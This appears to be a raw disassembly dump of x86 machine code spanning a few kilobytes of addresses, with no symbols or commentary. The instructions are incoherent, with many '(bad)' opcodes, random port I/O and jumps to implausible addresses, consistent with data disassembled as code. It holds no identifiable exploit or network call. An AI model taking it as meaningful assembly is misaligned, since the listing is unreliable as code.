  42769a:	in     eax,dx
  42769b:	mov    BYTE PTR [edx],ch
  42769d:	pop    eax
  42769e:	rcl    DWORD PTR [eax+0x18a94e51],cl
  4276a4:	test   al,0xa7
  4276a6:	out    0x3,eax
  4276a8:	or     eax,0xff8908d2
  4276ad:	repz clc 
  4276af:	ret    
  4276b0:	xor    bh,BYTE PTR [ebx+0x6d]
  4276b3:	sbb    BYTE PTR [edx],ch
  4276b5:	dec    esi
  4276b6:	out    0xb3,al
  4276b8:	and    DWORD PTR ds:0xbe8cf5,esi
  4276be:	out    0x3,eax
  4276c0:	and    eax,0xd0387ab
  4276c5:	jns    0x42772c
  4276c7:	mov    bh,0x3
  4276c9:	dec    esi
  4276ca:	out    0x7e,al
  4276cc:	mov    edx,0xf1b3e5d4
  4276d1:	repz jmp 0x6a7c:0x6c002af0
  4276d9:	jmp    esi
  4276db:	add    eax,DWORD PTR [eax]
	...
  4276f9:	add    BYTE PTR ds:0x8986944d,bh
  4276ff:	je     0x4276e8
  427701:	add    ecx,DWORD PTR ds:0xc12d9db0
  427707:	xchg   ebp,eax
  427708:	push   es
  427709:	add    ecx,DWORD PTR ds:0x92257f00
  42770f:	add    bh,ah
  427711:	mov    ch,0xd1
  427713:	add    eax,0xffe2cfbb
  427718:	call   DWORD PTR [ecx]
  42771a:	dec    esp
  42771b:	mov    dl,0x88
  42771d:	jge    0x42777e
  42771f:	mov    esi,0x4d226e8a
  427724:	cld    
  427725:	jmp    0x5684bae8
  42772a:	push   cs
  42772b:	test   DWORD PTR [edx+0x51],eax
  42772e:	fyl2x  
  427730:	pop    ss
  427731:	fisttp DWORD PTR [esi+0x4d]
  427734:	jg     0x4277b4
  427736:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427737:	dec    esi
  427738:	cld    
  427739:	jmp    0xe941c2ff
  42773e:	inc    ecx
  42773f:	mov    esi,0x56b62e88
  427744:	stc    
  427745:	push   ds
  427746:	fld    DWORD PTR [eax+0x78789dbf]
  42774c:	mov    WORD PTR [ecx-0x57fffff1],?
  427752:	xor    eax,0x8b977346
  427757:	xchg   esp,eax
  427758:	push   ebx
  427759:	call   0xcd2a776c
	...
  42777a:	add    BYTE PTR [eax],al
  42777c:	outs   dx,BYTE PTR ds:[esi]
  42777d:	dec    ebp
  42777e:	cld    
  42777f:	ins    DWORD PTR es:[edi],dx
  427780:	push   ecx
  427781:	shr    DWORD PTR [eax],1
  427783:	ins    BYTE PTR es:[edi],dx
  427784:	retf   0x5000
  427787:	(bad)  
  427788:	hlt    
  427789:	hlt    
  42778a:	push   cs
  42778b:	sub    DWORD PTR [ecx],ecx
  42778d:	ja     0x427713
  42778f:	and    DWORD PTR [eax],edx
  427791:	add    BYTE PTR [eax],al
  427793:	jb     0x4277a4
  427795:	test   DWORD PTR [ebx],ebx
  427797:	push   0xe85b943e
  42779c:	push   cs
  42779d:	add    ch,bh
  42779f:	outs   dx,BYTE PTR ds:[esi]
  4277a0:	jns    0x4277ef
  4277a2:	cld    
  4277a3:	jmp    0xfbf26a07
  4277a8:	into   
  4277a9:	dec    esp
  4277aa:	ret    0x5e24
  4277ad:	dec    esi
  4277ae:	pop    edx
  4277af:	add    BYTE PTR [ebx-0x46000bda],dl
  4277b5:	pop    esp
  4277b6:	push   cs
  4277b7:	inc    eax
  4277b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4277b9:	retf   0xff41
  4277bc:	ins    DWORD PTR es:[edi],dx
  4277bd:	les    edx,FWORD PTR [ecx-0x75]
  4277c0:	loopne 0x427746
  4277c2:	call   0x47976d3
  4277c7:	push   esi
  4277c8:	mov    ebx,0xe71074cd
  4277cd:	ret    
  4277ce:	adc    dh,bh
  4277d0:	xor    ebx,DWORD PTR [ebp-0x5]
  4277d3:	and    ecx,esp
  4277d5:	jle    0x427856
  4277d7:	cmp    al,0x65
  4277d9:	add    BYTE PTR [eax],al
  4277db:	push   eax
  4277dc:	sub    dh,BYTE PTR [edi]
  4277de:	sti    
	...
  4277fb:	add    BYTE PTR [eax],al
  4277fd:	add    BYTE PTR [edi+0x698900b8],dh
  427803:	mov    ah,0xfb
  427805:	adc    eax,0x3c523c
  42780a:	push   edi
  42780b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42780c:	test   DWORD PTR [ebp+0xc],esi
  42780f:	sti    
  427810:	scas   al,BYTE PTR es:[edi]
  427811:	pop    eax
  427812:	xor    eax,0x92760000
  427817:	int    0x7f
  427819:	push   esp
  42781a:	and    eax,0xf88d0000
  42781f:	outs   dx,DWORD PTR ds:[esi]
  427820:	xchg   DWORD PTR [eax],ecx
  427822:	imul   ecx,DWORD PTR [ecx+esi*2],0x4411d46
  427829:	je     0x42782f
  42782b:	retf   
  42782c:	cmp    eax,0x12c47710
  427831:	imul   DWORD PTR [edx+ebx*2+0x2da523bc]
  427838:	adc    BYTE PTR [ebx+0x575003a4],al
  42783e:	jae    0x427888
  427840:	push   esp
  427841:	push   ss
  427842:	hlt    
  427843:	add    edi,DWORD PTR [edi-0x3c]
  427846:	or     eax,0x38bf8765
  42784b:	cmp    BYTE PTR [ebp-0x80],bh
  42784e:	inc    ecx
  42784f:	pop    eax
  427850:	add    BYTE PTR [eax],al
  427852:	xchg   esi,eax
  427853:	xchg   ebp,eax
  427854:	nop
  427855:	out    0x57,eax
  427857:	or     BYTE PTR [edx-0x4],dl
  42785a:	xchg   ah,ch
  42785c:	dec    ebx
  42785d:	mov    BYTE PTR [esi+0x38d],cl
	...
  42787f:	add    BYTE PTR ds:0xd8824d6,cl
  427885:	sbb    ecx,eax
  427887:	cld    
  427888:	or     al,0xde
  42788a:	push   ebx
  42788b:	inc    ebp
  42788c:	xchg   esp,eax
  42788d:	mov    WORD PTR [eax+0x38],cs
  427890:	sahf   
  427891:	mov    eax,ds:0x870d0003
  427896:	jno    0x427917
  427898:	rcr    BYTE PTR [ecx],1
  42789a:	add    DWORD PTR [edx+edx*1-0x32],esi
  42789e:	dec    ebp
  42789f:	out    0xf9,eax
  4278a1:	jmp    0x4278f4
  4278a3:	cld    
  4278a4:	cmp    ch,BYTE PTR [esp+edx*2-0x4]
  4278a8:	sbb    BYTE PTR [ebp-0xe],bl
  4278ab:	aas    
  4278ac:	or     eax,0xc2fcc7cf
  4278b1:	push   0x3b
  4278b3:	rcl    DWORD PTR [ecx],0x59
  4278b6:	mov    bh,0x88
  4278b8:	and    esi,edx
  4278ba:	pop    esp
  4278bb:	and    ebx,DWORD PTR [esi+0xb]
  4278be:	mov    bh,0xe7
  4278c0:	mov    WORD PTR [esi-0x6f79fffd],ss
  4278c6:	js     0x427922
  4278c8:	std    
  4278c9:	jecxz  0x4278f5
  4278cb:	jb     0x4278df
  4278cd:	inc    edi
  4278ce:	inc    eax
  4278cf:	out    0x96,al
  4278d1:	pop    eax
  4278d2:	add    BYTE PTR [eax],al
  4278d4:	mov    ss,WORD PTR [ebx]
  4278d6:	hlt    
  4278d7:	inc    DWORD PTR [edi+0x50c6080d]
  4278dd:	add    BYTE PTR [esi+0x6bfa3e04],ah
  4278e3:	mov    DWORD PTR [eax],0x0
	...
  427901:	add    dh,dl
  427903:	push   edi
  427904:	in     eax,dx
  427905:	test   eax,0xc75b4ab2
  42790a:	(bad)  
  42790b:	js     0x427938
  42790d:	hlt    
  42790e:	xchg   ebp,eax
  42790f:	(bad)  
  427910:	out    dx,al
  427911:	push   eax
  427912:	pop    ds
  427913:	lock popa 
  427915:	xchg   esp,eax
  427916:	xchg   BYTE PTR [eax],al
  427918:	out    0x3,eax
  42791a:	jne    0x427948
  42791c:	cs push ecx
  42791e:	add    DWORD PTR [ebp+ebx*2-0x34813a2e],0xcb77724b
  427929:	push   edi
  42792a:	xchg   ebp,eax
  42792b:	(bad)  
  42792c:	jmp    0xe717d3f7
  427931:	push   eax
  427932:	fucomip st,st(3)
  427934:	xor    eax,0xb34afad7
  427939:	test   DWORD PTR [ecx-0x2c],0xfbbf50f6
  427940:	push   cs
  427941:	mov    ah,0x34
  427943:	jmp    esi
  427945:	jl     0x427969
  427947:	test   BYTE PTR [eax+ebx*8],dl
  42794a:	add    al,0x77
  42794c:	cmp    ebx,0xffffff95
  42794f:	sub    DWORD PTR [esi],ecx
  427951:	ret    
  427952:	sbb    BYTE PTR [edx-0xb],cl
  427955:	xchg   DWORD PTR [edx-0x2d],edx
  427958:	loop   0x4279a3
  42795a:	dec    edi
  42795b:	dec    ecx
  42795c:	out    0x5b,eax
  42795e:	icebp  
  42795f:	nop
  427960:	fst    QWORD PTR [eax-0x7b]
  427963:	stos   DWORD PTR es:[edi],eax
  427964:	(bad)  
  427965:	test   BYTE PTR [eax],al
	...
  427983:	add    BYTE PTR [edi+0x48],cl
  427986:	push   cs
  427987:	push   ecx
  427988:	push   edi
  427989:	push   esp
  42798a:	cmp    edx,DWORD PTR [eax-0x3630f21f]
  427990:	jns    0x427992
  427992:	add    cl,ch
  427994:	cdq    
  427995:	popa   
  427996:	aas    
  427997:	dec    esi
  427998:	push   cs
  427999:	add    BYTE PTR [edx+0x5dac5c2c],cl
  42799f:	inc    edx
  4279a0:	idiv   BYTE PTR [esi]
  4279a2:	pop    ss
  4279a3:	jmp    0x6b2df223
  4279a8:	dec    edx
  4279a9:	cmc    
  4279aa:	or     BYTE PTR [edi*1+0x18165149],0xc6
  4279b2:	pop    es
  4279b3:	(bad)  
  4279b4:	out    0x77,al
  4279b6:	test   BYTE PTR [ecx+0xf],bl
  4279b9:	add    BYTE PTR [eax],al
  4279bb:	jo     0x427a08
  4279bd:	dec    ebp
  4279be:	mov    BYTE PTR [edx+0x51428276],ch
  4279c4:	(bad)  
  4279c5:	push   esp
  4279c6:	cli    
  4279c7:	dec    esi
  4279c8:	mov    ebp,0x9abdbf7c
  4279cd:	dec    esp
  4279ce:	jb     0x4279bd
  4279d0:	fld    DWORD PTR ds:0x494ed9fc
  4279d6:	jmpw   0x37a5
  4279da:	repz mov ecx,0x36fcff60
  4279e0:	xchg   ecx,eax
  4279e1:	push   ecx
  4279e2:	(bad)  
  4279e3:	fwait
  4279e4:	sbb    DWORD PTR [edi+0x78],edi
  4279e7:	fld    QWORD PTR [eax]
	...
  427a05:	add    BYTE PTR [esi],cl
  427a07:	int    0x1a
  427a09:	jb     0x427a54
  427a0b:	frndint 
  427a0d:	je     0x427a29
  427a0f:	js     0x427a50
  427a11:	loope  0x4279aa
  427a13:	mov    ebp,0x750e83f7
  427a18:	inc    edx
  427a19:	fnstsw WORD PTR [ecx+0x42de01d6]
  427a1f:	push   es
  427a20:	add    ch,al
  427a22:	push   cs
  427a23:	add    BYTE PTR [ebx-0x19],dh
  427a26:	(bad)  
  427a27:	mov    ch,0xfb
  427a29:	add    bl,cl
  427a2b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427a2c:	push   es
  427a2d:	xor    ebx,DWORD PTR [ebp+0x11c13742]
  427a33:	std    
  427a34:	test   BYTE PTR [ebp+0x78],cl
  427a37:	mov    WORD PTR [edi+0x14a4bc5d],es
  427a3d:	(bad)  
  427a3e:	fwait
  427a3f:	mov    eax,0x98984587
  427a44:	push   edi
  427a45:	leave  
  427a46:	jbe    0x427a93
  427a48:	cld    
  427a49:	push   esp
  427a4a:	pop    ds
  427a4b:	loopne 0x427acc
  427a4d:	in     al,dx
  427a4e:	in     al,0x8c
  427a50:	push   edx
  427a51:	mov    edx,DWORD PTR [eax*8+0x1c031042]
  427a58:	sbb    al,al
  427a5a:	stc    
  427a5b:	mov    DWORD PTR [edx],edx
  427a5d:	and    esp,DWORD PTR ds:0x7cc07f91
  427a63:	mov    esp,fs
  427a65:	scas   al,BYTE PTR es:[edi]
  427a66:	xor    eax,DWORD PTR [eax+eax*1]
  427a69:	test   BYTE PTR [eax],al
	...
  427a87:	add    BYTE PTR [eax+ebp*1],dh
  427a8a:	add    esi,DWORD PTR [edx]
  427a8c:	and    al,0xab
  427a8e:	pop    DWORD PTR [ecx]
  427a90:	fs cld 
  427a92:	mov    BYTE PTR [ebp-0xc],bh
  427a95:	(bad)
  427a99:	or     edi,ebp
  427a9b:	call   DWORD PTR [edx+0x24e0797d]
  427aa1:	je     0x427aaf
  427aa3:	daa    
  427aa4:	xor    al,0xfc
  427aa6:	mov    ah,0x30
  427aa8:	mov    eax,ds:0x2873fffc
  427aad:	bound  esi,QWORD PTR ds:0xd42e0445
  427ab3:	mov    bp,0xdc40
  427ab7:	ja     0x427a7f
  427ab9:	pop    ebp
  427aba:	jg     0x427b39
  427abc:	loopne 0x427ac1
  427abe:	je     0x427acc
  427ac0:	or     eax,0xe1430ab7
  427ac5:	stos   DWORD PTR es:[edi],eax
  427ac6:	inc    esi
  427ac7:	gs and al,0xc
  427aca:	pop    eax
  427acb:	je     0x427a67
  427acd:	ror    bh,cl
  427acf:	pop    es
  427ad0:	adc    dh,0x74
  427ad3:	dec    dl
  427ad5:	pop    ecx
  427ad6:	mov    al,0xc5
  427ad8:	dec    eax
  427ad9:	mov    ds:0xa050c600,al
  427ade:	add    edi,ebp
  427ae0:	sbb    BYTE PTR [ecx],dh
  427ae2:	repz aas 
  427ae4:	or     eax,0x780c40dc
  427ae9:	adc    al,0x4a
  427aeb:	out    0x0,eax
	...
  427b09:	add    BYTE PTR [ecx+ebx*4+0x71860000],bh
  427b10:	xchg   eax,ebx
  427b12:	sbb    bl,ch
  427b14:	cmp    edi,0x427f5982
  427b1a:	inc    ebp
  427b1b:	mov    DWORD PTR [ecx-0x10],edi
  427b1e:	sub    DWORD PTR gs:[edi-0x1],eax
  427b22:	push   0xffffffdc
  427b24:	inc    eax
  427b25:	ja     0x427b48
  427b27:	rcl    BYTE PTR [eax+0x68],cl
  427b2a:	arpl   WORD PTR [ecx],ax
  427b2c:	add    DWORD PTR [ecx],esi
  427b2e:	lea    ecx,[esi+eax*2+0x409499ff]
  427b35:	jae    0x427b58
  427b37:	jae    0x427b39
  427b39:	push   ecx
  427b3a:	and    eax,0x32ff41c2
  427b3f:	add    DWORD PTR [esi-0x24],esp
  427b42:	or     eax,0x94c87959
  427b47:	xchg   edi,eax
  427b48:	add    al,0xe8
  427b4a:	pop    ds
  427b4b:	sbb    DWORD PTR [ecx],eax
  427b4d:	add    BYTE PTR [ebp+0x16e84994],al
  427b53:	add    DWORD PTR [ebx],0x51
  427b56:	cmc    
  427b57:	jmp    DWORD PTR [ebp+0x6e46fa41]
  427b5d:	(bad)  
  427b5e:	sti    
  427b5f:	jp     0x427bb4
  427b61:	cld    
  427b62:	cmc    
  427b63:	sbb    ah,BYTE PTR [edi-0x31]
  427b66:	in     al,0xff
  427b68:	cmp    ah,BYTE PTR [edi]
  427b6a:	mov    edx,cs
  427b6c:	loop   0x427b7f
	...
  427b8a:	add    BYTE PTR [eax],al
  427b8c:	push   esi
  427b8d:	out    0x40,eax
  427b8f:	add    edx,DWORD PTR [esi-0x2a865944]
  427b95:	push   edi
  427b96:	lahf   
  427b97:	inc    edx
  427b98:	mov    edx,0x3e446246
  427b9d:	mul    DWORD PTR [ecx+0x39]
  427ba0:	mov    dl,0x89
  427ba2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427ba3:	add    al,0xd
  427ba5:	jl     0x427b4d
  427ba7:	fmul   DWORD PTR [esi]
  427ba9:	and    ecx,DWORD PTR ds:[ecx-0x6d]
  427bad:	inc    ebp
  427bae:	mov    ecx,0xe664ab5b
  427bb3:	add    ebx,esp
  427bb5:	push   edi
  427bb6:	sub    DWORD PTR [edi+0x7a],0x74cf6646
  427bbd:	(bad)  
  427bbe:	(bad)  
  427bc0:	xchg   edi,eax
  427bc1:	jle    0x427c35
  427bc3:	add    ecx,DWORD PTR ds:0xff4c9700
  427bc9:	jecxz  0x427ba3
  427bcb:	ret    
  427bcc:	push   edx
  427bcd:	(bad)  
  427bce:	mov    bl,0x48
  427bd0:	dec    edx
  427bd1:	shl    ch,cl
  427bd3:	xchg   ebx,eax
  427bd4:	inc    ebx
  427bd5:	push   edi
  427bd6:	outs   dx,DWORD PTR ds:[esi]
  427bd7:	add    al,0xd
  427bd9:	add    BYTE PTR [edi-0x31],ah
  427bdc:	cmp    edi,edi
  427bde:	in     eax,0x87
  427be0:	das    
  427be1:	inc    ebp
  427be2:	or     eax,0x8e7e974d
  427be7:	add    cl,BYTE PTR ds:0xcf7a9700
  427bed:	idiv   edi
  427bef:	cmc    
	...
  427c0c:	add    BYTE PTR [eax],al
  427c0e:	add    ebp,esi
  427c10:	adc    DWORD PTR [ecx-0x4ebd86f2],ebp
  427c16:	jnp    0x427c7c
  427c18:	pop    edi
  427c19:	call   0x62927c2c
  427c1e:	cmp    eax,0xea5aa5d
  427c23:	add    BYTE PTR [ebx-0x76e43957],al
  427c29:	mov    ecx,0xea374bb5
  427c2e:	sbb    eax,0x4219ffda
  427c33:	retf   0x91bf
  427c36:	test   al,0x40
  427c38:	(bad)  
  427c39:	call   0x823b3e74
  427c3e:	icebp  
  427c3f:	and    bh,bh
  427c41:	call   0x7246376d
  427c46:	dec    ebp
  427c47:	pop    ebp
  427c48:	pop    eax
  427c49:	test   al,0xe
  427c4b:	add    cl,ch
  427c4d:	shl    DWORD PTR [esi+eax*2-0x75],0x24
  427c52:	leave  
  427c53:	ja     0x427c1d
  427c55:	push   ecx
  427c56:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427c57:	aas    
  427c58:	(bad)  
  427c59:	call   0x6e3b3e54
  427c5e:	into   
  427c5f:	rcl    BYTE PTR [edx],1
  427c61:	push   0xe8fee191
  427c66:	push   cs
  427c67:	jo     0x427c67
  427c69:	call   0xfa49427c
  427c6e:	into   
  427c6f:	ja     0x427c39
  427c71:	inc    ecx
	...
  427c8e:	add    BYTE PTR [eax],al
  427c90:	pop    es
  427c91:	inc    eax
  427c92:	(bad)  
  427c93:	call   0x1e4a4e61
  427c98:	cmp    ebp,ecx
  427c9a:	adc    DWORD PTR [ecx+0x12427a0e],ebp
  427ca0:	jno    0x427c45
  427ca2:	pop    eax
  427ca3:	add    ch,bl
  427ca5:	mov    esi,0xc8790000
  427caa:	call   0x52cb8d32
  427caf:	lea    esi,[edi+0x29]
  427cb2:	std    
  427cb3:	jmp    esp
  427cb5:	xchg   ecx,eax
  427cb6:	dec    esp
  427cb7:	(bad)  
  427cb8:	sub    DWORD PTR [ecx-0x53c67704],edi
  427cbe:	sti    
  427cbf:	adc    eax,0x3c4adc
  427cc4:	xlat   BYTE PTR ds:[ebx]
  427cc5:	rol    BYTE PTR [ebp+0x7ef2cc45],0x64
  427ccc:	mov    ch,0x0
  427cce:	add    BYTE PTR [edi],cl
  427cd0:	(bad)  
  427cd1:	sti    
  427cd2:	cld    
  427cd3:	jmp    DWORD PTR [ebx+eax*8+0x753ff441]
  427cda:	pop    esp
  427cdb:	add    DWORD PTR [eax+eax*1-0x3b878301],esi
  427ce2:	jno    0x427cec
  427ce4:	and    DWORD PTR [ecx+0x4],eax
  427ce7:	push   eax
  427ce8:	jl     0x427ce6
  427cea:	ret    
  427ceb:	add    BYTE PTR [edi+edi*2-0x44],dh
  427cef:	paddsw mm0,mm6
  427cf2:	cld    
  427cf3:	inc    DWORD PTR [eax]
	...
  427d11:	add    BYTE PTR [esi+ebp*4+0x41],ah
  427d15:	or     al,0x65
  427d17:	das    
  427d18:	or     BYTE PTR [ebx+0x4747d3a],cl
  427d1e:	push   es
  427d1f:	dec    ecx
  427d20:	mov    DWORD PTR [ecx-0x9ffff9c],edi
  427d26:	test   eax,0x5873fe4c
  427d2b:	and    dh,BYTE PTR [ecx*4+0x50537869]
  427d32:	repz dec esi
  427d34:	dec    eax
  427d35:	push   ss
  427d36:	add    BYTE PTR fs:[edi-0x7b10f2bb],al
  427d3d:	ret    
  427d3e:	adc    DWORD PTR [esp+edi*2+0x570c5f],esp
  427d45:	call   0x469728
  427d4a:	or     al,ch
  427d4c:	push   eax
  427d4d:	cld    
  427d4e:	push   eax
  427d4f:	push   ecx
  427d50:	test   DWORD PTR [edx+0x1],ebp
  427d53:	and    cl,BYTE PTR [ecx+0x12]
  427d56:	adc    DWORD PTR [edi-0x40],eax
  427d59:	call   DWORD PTR [edi-0x1d017f22]
  427d5f:	pop    ecx
  427d60:	(bad)  
  427d62:	mov    DWORD PTR [esp+ecx*4],edx
  427d65:	dec    edi
  427d66:	push   ds
  427d67:	cdq    
  427d68:	pop    eax
  427d69:	cmp    BYTE PTR [edi-0x75],0x49
  427d6d:	or     ch,0x13
  427d70:	lock imul ecx,DWORD PTR [esp+ecx*8],0xb7bf
	...
  427d94:	xchg   BYTE PTR [ebx+0x59cc7058],dl
  427d9a:	add    BYTE PTR [ebp+ecx*8+0x50c5ffed],al
  427da1:	jp     0x427da6
  427da3:	std    
  427da4:	sbb    cl,cl
  427da6:	dec    ecx
  427da7:	adc    ah,BYTE PTR ds:0x77ffc027
  427dad:	loop   0x427d8c
  427daf:	inc    DWORD PTR [edi+0x65cd7e12]
  427db5:	mov    WORD PTR [ebx-0x1],es
  427db8:	push   0xffffffd5
  427dba:	inc    eax
  427dbb:	jae    0x427df3
  427dbd:	mov    esi,0x50c8891f
  427dc2:	jge    0x427db3
  427dc4:	out    0xa,al
  427dc6:	or     DWORD PTR [ecx],eax
  427dc8:	cld    
  427dc9:	add    BYTE PTR ds:[edi+0x35],cl
  427dcd:	mov    dh,0x43
  427dcf:	(bad)  
  427dd0:	cmp    al,BYTE PTR [eax]
  427dd2:	imul   eax,DWORD PTR [ebx-0x42],0xfffffffb
  427dd6:	and    al,0xc0
  427dd8:	sub    DWORD PTR [ecx],eax
  427dda:	(bad)  
  427ddb:	retf   0x90e
  427dde:	(bad)  
  427ddf:	call   FWORD PTR [ebp+0xec96ffa]
  427de5:	cmp    ah,BYTE PTR [ebx-0x5489f4b6]
  427deb:	dec    ebx
  427dec:	xchg   edi,eax
  427ded:	jbe    0x427d75
  427def:	add    al,0xd
  427df1:	add    bh,cl
  427df3:	lahf   
  427df4:	int3   
  427df5:	jmp    esi
  427df7:	dec    eax
	...
  427e14:	add    BYTE PTR [eax],al
  427e16:	push   edi
  427e17:	dec    eax
  427e18:	imul   edx,edi,0xbfce07de
  427e1e:	loop   0x427e96
  427e20:	sub    ecx,DWORD PTR [ebp+ecx*4-0x44]
  427e24:	mov    dl,0xc
  427e26:	add    al,0x7f
  427e28:	dec    edx
  427e29:	add    ecx,DWORD PTR ds:0xc77de00
  427e2f:	inc    ebx
  427e30:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427e31:	dec    ecx
  427e32:	mov    cl,0xcc
  427e34:	xchg   esi,eax
  427e35:	dec    ecx
  427e36:	jmp    ebx
  427e38:	clc    
  427e39:	ret    
  427e3a:	mov    ds:0x9a490bc2,al
  427e3f:	into   
  427e40:	out    dx,al
  427e41:	jl     0x427e92
  427e43:	clc    
  427e44:	mov    gs,WORD PTR [ebx]
  427e46:	leave  
  427e47:	jmp    esi
  427e49:	jge    0x427e1a
  427e4b:	inc    edx
  427e4c:	or     eax,0xee3d53aa
  427e51:	add    esp,edi
  427e53:	call   FWORD PTR [ebp-0x6c]
  427e56:	call   0xeaec:0x6003e700
  427e5d:	hlt    
  427e5e:	sbb    al,BYTE PTR [eax]
  427e60:	ds sub al,0xf5
  427e63:	aas    
  427e64:	xor    eax,0xff874d2c
  427e69:	fucompp 
  427e6b:	add    eax,0x776a2aa2
  427e70:	jmp    0x427edc
  427e72:	lods   eax,DWORD PTR ds:[esi]
  427e73:	dec    edx
  427e74:	jle    0x427e83
  427e76:	add    eax,0xe8fff9
	...
  427e97:	add    BYTE PTR [ecx-0x54],bl
  427e9a:	push   esp
  427e9b:	and    DWORD PTR [esi-0x6e16fff8],0xead4fc49
  427ea5:	out    dx,eax
  427ea6:	aas    
  427ea7:	jmp    0x99664c27
  427eac:	push   esi
  427ead:	or     DWORD PTR [ecx-0x1a],esp
  427eb0:	inc    ebp
  427eb1:	js     0x427ee5
  427eb3:	or     ebx,esp
  427eb5:	add    DWORD PTR [eax],eax
  427eb7:	bound  ebx,QWORD PTR fs:0xee9d0
  427ebe:	push   eax
  427ebf:	(bad)  
  427ec0:	sbb    al,0x80
  427ec2:	mov    ds:0xfc41a505,eax
  427ec7:	jmp    0x434254da
  427ecc:	push   cs
  427ecd:	xadd   BYTE PTR [edx+ebp*1+0x1d],dh
  427ed2:	mov    eax,0x87000ee9
  427ed7:	push   ebp
  427ed8:	add    dl,BYTE PTR [eax+0x580ee8ff]
  427ede:	jp     0x427ee6
  427ee0:	inc    esp
  427ee1:	inc    esp
  427ee2:	imul   ebp,ecx,0xa930ff68
  427ee8:	sti    
  427ee9:	and    esp,DWORD PTR fs:[ecx+0x5100000e]
  427ef0:	push   ecx
  427ef1:	(bad)  
  427ef2:	cld    
  427ef3:	pop    esi
  427ef4:	jecxz  0x427eb2
  427ef6:	and    edi,DWORD PTR [ecx-0x7adc8319]
	...
  427f18:	add    BYTE PTR [eax],al
  427f1a:	push   cs
  427f1b:	add    BYTE PTR [eax],al
  427f1d:	add    ch,bl
  427f1f:	and    BYTE PTR [eax],0x14
  427f22:	mov    ecx,0xa4182080
  427f27:	(bad)  
  427f28:	mov    eax,0xfffd9024
  427f2d:	(bad)  
  427f2e:	mov    ebp,0xb142038
  427f33:	js     0x3c91e356
  427f39:	add    BYTE PTR [esi-0x6609d0bb],cl
  427f3f:	and    BYTE PTR [eax],0x34
  427f42:	mov    ds:0x77d3fb8c,al
  427f47:	add    DWORD PTR [ecx],ecx
  427f49:	push   0xffffffd4
  427f4b:	leave  
  427f4c:	inc    eax
  427f4d:	and    al,0x28
  427f4f:	xchg   edx,eax
  427f50:	dec    esp
  427f51:	jmp    DWORD PTR [edi+0x220cc07c]
  427f57:	mov    DWORD PTR [eax+0x24],0x2470c3e0
  427f5e:	sbb    bl,al
  427f60:	jo     0x427f86
  427f62:	and    al,0xa4
  427f64:	or     dh,BYTE PTR [esp+esi*4+0x59c786fc]
  427f6b:	jo     0x427f8d
  427f6d:	call   0xe8427c16
  427f72:	cmp    bh,BYTE PTR [ebx]
  427f74:	sti    
  427f75:	jmp    FWORD PTR [ecx]
  427f77:	and    BYTE PTR [eax],0x98
  427f7a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427f7b:	cld    
  427f7c:	push   DWORD PTR [edx]
	...
  427f9a:	add    BYTE PTR [eax],al
  427f9c:	adc    cl,BYTE PTR [ebp+eax*4-0x28baf4c]
  427fa3:	push   DWORD PTR [ebx+eax*8-0x50]
  427fa7:	and    al,0x28
  427fa9:	sti    
  427faa:	(bad)  
  427fab:	jmp    DWORD PTR [ebx]
  427fad:	and    BYTE PTR [eax],0xb4
  427fb0:	jne    0x427fae
  427fb2:	call   FWORD PTR [ebx-0x3fd0f3]
  427fb8:	pop    ebx
  427fb9:	dec    ebx
  427fba:	and    BYTE PTR [edx],dl
  427fbc:	int    0x56
  427fbe:	fsubr  st,st(1)
  427fc0:	push   cs
  427fc1:	push   edi
  427fc2:	add    BYTE PTR [ebx-0x1bc0d77],cl
  427fc8:	cmp    dl,BYTE PTR [esi-0x56]
  427fcb:	dec    edi
  427fcc:	xor    al,BYTE PTR ds:0xb2f18377
  427fd2:	add    eax,DWORD PTR [eax]
  427fd4:	or     eax,0xc7f7ce0
  427fd9:	push   edi
  427fda:	add    BYTE PTR [ebx-0x791bcd37],cl
  427fe0:	xchg   edx,eax
  427fe1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427fe2:	add    al,BYTE PTR [eax]
  427fe4:	or     eax,0x1237fa4
  427fe9:	sub    al,BYTE PTR [eax]
  427feb:	add    BYTE PTR [esi-0x6d790b93],cl
  427ff1:	mov    cl,0x3
  427ff3:	add    BYTE PTR ds:0x75237ca4,cl
  427ff9:	sub    BYTE PTR [eax],al
  427ffb:	add    BYTE PTR [edx],bh
  427ffd:	mov    al,0x7d
  427fff:	mov    eax,DWORD PTR [eax]
	...
  42801d:	add    BYTE PTR [ecx+ebp*1],cl
  428020:	add    al,ch
  428022:	mov    ch,0x79
  428024:	inc    ebp
  428025:	cld    
  428026:	daa    
  428027:	and    DWORD PTR [eax+0x1a],ebx
  42802a:	xchg   edi,eax
  42802b:	sub    DWORD PTR [eax],eax
  42802d:	or     ebp,0x15
  428030:	test   esp,0x3fcf650d
  428036:	or     eax,0x8603c8a0
  42803b:	mov    ecx,0xb73e0159
  428040:	ja     0x428085
  428042:	sub    DWORD PTR [ecx],ebx
  428044:	pop    esp
  428045:	mov    eax,0x8345af71
  42804a:	dec    ebp
  42804b:	add    ah,bl
  42804d:	cli    
  42804e:	xchg   ebp,eax
  42804f:	inc    edi
  428050:	dec    esi
  428051:	int3   
  428052:	pusha  
  428053:	aas    
  428054:	push   ebp
  428055:	jg     0x427ff1
  428057:	mov    ch,0x1c
  428059:	(bad)  [edx-0x3fc19d7]
  42805f:	pop    edx
  428060:	cdq    
  428061:	js     0x427fec
  428063:	loopne 0x42804c
  428065:	add    ecx,DWORD PTR ds:0x898dddd0
  42806b:	clc    
  42806c:	out    0x3,eax
  42806e:	or     eax,0x26f01dd0
  428073:	adc    BYTE PTR [edi+0xd388c03],ah
  428079:	iret   
  42807a:	cld    
  42807b:	cld    
  42807c:	call   0x73428d85
  428081:	cli    
	...
  42809e:	add    BYTE PTR [eax],al
  4280a0:	adc    DWORD PTR [esi+0x65],esi
  4280a3:	or     edi,edx
  4280a5:	ds out 0xa,al
  4280a8:	mov    dl,0xb1
  4280aa:	imul   DWORD PTR [edx+esi*8-0x1eba2945]
  4280b1:	mov    WORD PTR [edx],gs
  4280b3:	and    BYTE PTR ds:0xd1e3d728,bh
  4280b9:	ror    DWORD PTR ds:[ecx+0x24658b95],1
